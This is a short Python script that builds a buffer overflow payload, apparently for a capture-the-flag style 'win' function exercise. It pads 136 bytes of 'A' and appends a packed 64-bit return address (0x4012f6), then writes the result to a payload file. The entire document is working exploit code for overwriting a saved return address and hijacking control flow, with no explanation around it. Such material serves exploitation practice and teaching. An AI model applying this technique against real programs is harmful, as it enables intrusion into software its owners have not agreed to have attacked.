import struct

OFFSET = 136
WIN_ADDRESS = 0x4012f6

padding = b"A" * OFFSET

return_address = struct.pack("<Q", WIN_ADDRESS)

payload = padding + return_address

with open("inbox/payload.bin", "wb") as file:
    file.write(payload)

print(f"Payload created: {len(payload)} bytes")
